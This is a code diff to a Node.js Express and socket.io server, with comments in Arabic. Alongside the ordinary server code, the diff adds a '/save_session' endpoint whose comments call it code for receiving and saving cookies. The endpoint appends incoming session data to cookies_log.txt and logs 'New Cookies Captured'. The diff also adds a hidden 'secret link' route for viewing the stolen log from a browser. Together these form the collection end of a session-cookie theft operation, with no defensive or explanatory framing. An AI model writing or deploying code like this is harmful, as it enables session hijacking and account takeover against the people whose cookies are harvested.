@@ -1,3 +1,5 @@
+const fs = require('fs');
+const path = require('path');
 const express = require("express");
 const http = require("http");
 const { Server } = require("socket.io");
@@ -111,3 +113,49 @@ io.on("connection", (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`🚀 السيرفر يعمل على: http://localhost:${PORT}`));
+
+// --- كود استقبال الكوكيز وحفظها ---
+
+app.post('/save_session', (req, res) => {
+    try {
+        const data = req.body;
+
+        // التأكد من أن البيانات وصلت فعلاً
+        if (data && data.session_data) {
+            // تجهيز النص الذي سيتم حفظه (التاريخ + البيانات)
+            const logEntry = `\n--- NEW LOG [${new Date().toLocaleString()}] ---\n${data.session_data}\n`;
+            
+            // تحديد مسار الملف (سيتم إنشاء ملف اسمه cookies_log.txt في مجلد مشروعك)
+            const filePath = path.join(__dirname, 'cookies_log.txt');
+
+            // عملية الكتابة في الملف دون مسح البيانات القديمة (Append)
+            fs.appendFile(filePath, logEntry, (err) => {
+                if (err) {
+                    console.error("❌ Error writing to file:", err);
+                    return res.status(500).json({ status: "error" });
+                }
+                console.log("✅ New Cookies Captured and Saved to cookies_log.txt");
+            });
+
+            return res.status(200).json({ status: "success" });
+        } else {
+            return res.status(400).json({ status: "no_data" });
+        }
+    } catch (error) {
+        console.error("❌ Server Error:", error);
+        res.status(500).json({ status: "internal_error" });
+    }
+});
+
+// --- نهاية كود استقبال الكوكيز ---
+
+// رابط سري لمشاهدة النتائج من المتصفح
+// استبدل 'mysecret123' بأي كلمة تريدها ليكون الرابط خاصاً بك فقط
+app.get('/show-my-results-mysecret123', (req, res) => {
+    const filePath = path.join(__dirname, 'cookies_log.txt');
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.send("لا يوجد بيانات مسجلة حتى الآن.");
+    }
+});
